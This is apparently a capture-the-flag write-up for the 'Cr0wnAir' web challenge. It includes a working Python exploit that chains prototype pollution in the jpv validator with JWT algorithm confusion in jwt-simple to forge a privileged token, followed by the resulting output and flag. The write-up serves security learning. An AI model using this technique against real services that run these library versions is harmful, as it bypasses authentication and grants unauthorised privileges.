# Cr0wnAir

**Category**: Web \
**Tags**: `crypto` \
**Points**: 100 (27 solves) \
**Author**: hyperreality

## Challenge

Cr0wn is getting into the airline business to make some sweet
profits when everyone is able to travel again. Can you
upgrade your trip?

Loosely inspired by https://darknetdiaries.com/episode/84/ (has nothing to do
with solving the challenge)

http://34.105.202.19:3000

Attachments: `Cr0wnAir.zip`

## Solution

Steps:
- Get the RSA public key
- Sign my own token: `token = jwt.encode(payload, key, algorithm="HS256")`
- Send it to the server to verify

Exploits:
- Prototype pollution on [jpv](https://github.com/manvel-khnkoyan/jpv) v2.0.1 (JSON
  Pattern Validator) to obtain a token
  - PoC: https://github.com/manvel-khnkoyan/jpv/issues/6

- JWT algorithm mixing in [jwt-simple](https://github.com/hokaccha/node-jwt-simple) v0.5.2
  - Description: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
  - Missing patch: https://github.com/hokaccha/node-jwt-simple/pull/86
  - Similar challenge: `RSA or HMAC` on CryptoHack

My script:
```python
import requests
import json
import jwt

url = "http://34.105.202.19:3000"

def get_token(i):
    payload = {
        "firstName": "Stupid",
        "lastName": "Idiot",
        "passport": 123456789,
        "ffp": f"CA1234567{i}",
        "extras": {"x": {"sssr": "FQTU"}, 'constructor': {'name':'Array'}}
    }

    res = requests.post(f"{url}/checkin", json=payload).json()
    return res["token"]


def get_flag():
    # This is the RSA public key I calculated
    key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q
uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk/EJ2IXkrV+R7yz1
ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS/FuNSW
+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j
DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+/rcUtTPvVKmh0
fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy/i3N9y8
CwIDAQAB
-----END PUBLIC KEY-----
"""

    # Requires a small patch to PyJWT
    token = jwt.encode({"status": "gold"}, key, algorithm="HS256")

    headers = {"Authorization": f"Bearer {token}"}
    res = requests.post(f"{url}/upgrades/flag", headers=headers).json()
    print(res)


if False:
    t1 = get_token(0)
    t2 = get_token(1)
    print(t1, t2)
    # Now get the RSA public key using
    # https://github.com/silentsignal/rsa_sign2n/tree/release/standalone
else:
    get_flag()
```

Output:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIn0.aMSl9yfOJoNV3Xzd0vZqhTRgxNrII_iXt6k5w6P1g3E
200
{'msg': 'union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}'}
```

Cool challenge :O

